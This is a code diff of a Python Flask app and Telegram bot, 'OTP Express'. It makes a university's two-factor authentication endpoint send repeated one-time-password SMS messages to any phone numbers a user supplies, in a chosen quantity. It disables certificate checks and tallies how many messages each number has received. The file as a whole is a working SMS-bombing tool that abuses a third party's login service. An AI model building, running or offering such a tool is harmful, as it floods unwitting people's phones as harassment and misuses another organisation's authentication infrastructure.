@@ -1,33 +1,30 @@
-import telebot
-telebot.apihelper.THREAD_POOL_SIZE = 1
-telebot.apihelper.RETRY_ON_ERROR = True
 import os
 import time
-import threading
 import requests
 import telebot
 from flask import Flask, render_template, request
 import urllib3
+import threading
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ===================== FLASK APP =====================
 app = Flask(__name__)
 
 OTP_GEN_URL = "https://twofa.srmu.ac.in/otp/generate"
+
 otp_tracker = {}
 
-# ===================== TELEGRAM BOT =====================
-API_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
-if not API_TOKEN:
-    raise RuntimeError("❌ TELEGRAM_BOT_TOKEN not set")
-
+# ===== TELEGRAM BOT SETUP =====
+API_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
 bot = telebot.TeleBot(API_TOKEN)
 
-# ===================== CORE OTP FUNCTION =====================
+
+# ===================== CORE FUNCTION =====================
+
 def send_otps(numbers, otp_count):
     session = requests.Session()
     session.verify = False
+
     batch_results = []
 
     for phone in numbers:
@@ -37,8 +34,10 @@ def send_otps(numbers, otp_count):
         for _ in range(otp_count):
             try:
                 session.post(f"{OTP_GEN_URL}/{phone}/123", timeout=10)
+
                 sent += 1
                 otp_tracker[phone] += 1
+
                 time.sleep(1)
 
             except Exception as e:
@@ -49,6 +48,7 @@ def send_otps(numbers, otp_count):
                     "total_sent": otp_tracker[phone]
                 })
                 break
+
         else:
             batch_results.append({
                 "phone": phone,
@@ -60,72 +60,79 @@ def send_otps(numbers, otp_count):
     return batch_results
 
 
-# ===================== BACKGROUND JOB =====================
-def process_otp_job(chat_id, numbers, otp_count):
-    results = send_otps(numbers, otp_count)
+# ===================== TELEGRAM BOT HANDLERS =====================
 
-    response = ["✅ OTP Result:"]
-    for r in results:
-        response.append(
-            f"📱 {r['phone']} → {r['status']} | Sent: {r['sent_now']} | Total: {r['total_sent']}"
-        )
-
-    bot.send_message(chat_id, "\n".join(response))
-
-
-# ===================== TELEGRAM COMMANDS =====================
-@bot.message_handler(commands=["start", "help"])
-def welcome(message):
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
     bot.reply_to(
         message,
-        "✅ *OTP Express is running!*\n\n"
-        "Commands:\n"
-        "/send <phone1,phone2> <count>\n"
-        "/status - OTP stats\n"
-        "/ping - Health check\n\n"
+        "Welcome to OTP Express!\n\n"
+        "Use command:\n"
+        "/send <phone1,phone2> <count>\n\n"
         "Example:\n"
-        "`/send 9876543210,1234567890 5`",
-        parse_mode="Markdown"
+        "/send 9876543210,1234567890 5"
     )
 
 
-@bot.message_handler(commands=["send"])
-def handle_send(message):
+@bot.message_handler(commands=['send'])
+def handle_send_otp(message):
     try:
         args = message.text.split()
+
         if len(args) < 3:
-            bot.reply_to(message, "❌ Usage: /send <phone1,phone2> <count>")
+            bot.reply_to(message, "Usage: /send <phone1,phone2> <count>")
+            return
+
+        phones_raw = args[1]
+
+        try:
+            otp_count = int(args[2])
+            if otp_count <= 0:
+                raise ValueError
+        except ValueError:
+            bot.reply_to(message, "OTP count must be positive number.")
             return
 
         numbers = [
-            n.strip() for n in args[1].split(",")
+            n.strip() for n in phones_raw.split(",")
             if n.strip().isdigit()
         ]
 
-        otp_count = int(args[2])
-        if otp_count <= 0:
-            raise ValueError
-
         if not numbers:
-            bot.reply_to(message, "❌ Invalid phone numbers")
+            bot.reply_to(message, "Invalid phone numbers.")
             return
 
-        bot.reply_to(message, "🚀 OTP request received. Processing...")
+        # Respond immediately so webhook doesn't time out
+        bot.reply_to(message, f"🚀 Sending OTP to {len(numbers)} numbers (running in background)...")
 
-        threading.Thread(
-            target=process_otp_job,
-            args=(message.chat.id, numbers, otp_count),
-            daemon=True
-        ).start()
+        # Define the task to run in background
+        def task():
+            try:
+                results = send_otps(numbers, otp_count)
 
-    except Exception:
-        bot.reply_to(message, "❌ Usage: /send <phone1,phone2> <count>")
+                response = ["✅ OTP Result:"]
+                for r in results:
+                    response.append(
+                        f"📱 {r['phone']} → {r['status']} | Sent: {r['sent_now']} | Total: {r['total_sent']}"
+                    )
+
+                bot.reply_to(message, "\n".join(response))
+            except Exception as inner_e:
+                # Need a way to log this, but referencing 'message' might be stale if very long.
+                # However for a simple bot this is usually fine.
+                print(f"Error in background task: {inner_e}")
+
+        # Start background thread
+        threading.Thread(target=task).start()
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
 
 
-@bot.message_handler(commands=["status"])
-def status(message):
+@bot.message_handler(commands=['status'])
+def handle_status(message):
     if not otp_tracker:
-        bot.reply_to(message, "ℹ️ No OTP activity yet.")
+        bot.reply_to(message, "No activity yet.")
         return
 
     msg = "📊 OTP Tracker:\n"
@@ -135,36 +142,51 @@ def status(message):
     bot.reply_to(message, msg)
 
 
-@bot.message_handler(commands=["ping"])
-def ping(message):
-    bot.reply_to(message, "pong ✅")
-
-
 # ===================== TELEGRAM WEBHOOK =====================
+
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
-    update = telebot.types.Update.de_json(request.get_json())
+    json_str = request.get_data().decode("UTF-8")
+    update = telebot.types.Update.de_json(json_str)
     bot.process_new_updates([update])
     return "OK", 200
 
 
+def set_webhook():
+    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 
-# ===================== WEB DASHBOARD =====================
+    if not WEBHOOK_URL:
+        print("❌ WEBHOOK_URL not set in env!")
+        return
+
+    bot.remove_webhook()
+    time.sleep(1)
+
+    bot.set_webhook(url=WEBHOOK_URL)
+    print("✅ Webhook set to:", WEBHOOK_URL)
+
+
+# ===================== FLASK DASHBOARD =====================
+
 @app.route("/", methods=["GET", "POST"])
 def index():
     results = []
     error = None
 
     if request.method == "POST":
-        numbers_raw = request.form.get("numbers", "")
-        otp_count = request.form.get("otp_count", "1")
+        numbers_raw = request.form.get("numbers", "").strip()
+        otp_count = request.form.get("otp_count", "1").strip()
+
+        if not numbers_raw:
+            error = "Enter at least one number."
+            return render_template("index.html", error=error)
 
         try:
             otp_count = int(otp_count)
             if otp_count <= 0:
                 raise ValueError
         except ValueError:
-            error = "OTP count must be positive"
+            error = "OTP count must be positive."
             return render_template("index.html", error=error)
 
         numbers = [
@@ -172,10 +194,7 @@ def index():
             if n.strip().isdigit()
         ]
 
-        if not numbers:
-            error = "Enter valid numbers"
-        else:
-            results = send_otps(numbers, otp_count)
+        results = send_otps(numbers, otp_count)
 
     return render_template(
         "index.html",
@@ -185,26 +204,8 @@ def index():
     )
 
 
-# ===================== INIT BOT =====================
-def init_bot():
-    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
-    if not WEBHOOK_URL:
-        print("❌ WEBHOOK_URL not set")
-        return
+# ===================== START APP =====================
 
-    full_url = f"{WEBHOOK_URL}/telegram-webhook"
-    bot.remove_webhook()
-    time.sleep(1)
-    bot.set_webhook(url=full_url)
-
-    print("✅ Webhook set:", full_url)
-
-    owner = os.environ.get("OWNER_CHAT_ID")
-    if owner:
-        try:
-            bot.send_message(owner, "✅ Bot deployed successfully 🚀")
-        except:
-            pass
-
-
-init_bot()
+if __name__ == "__main__":
+    set_webhook()
+    app.run(host="0.0.0.0", port=10000)
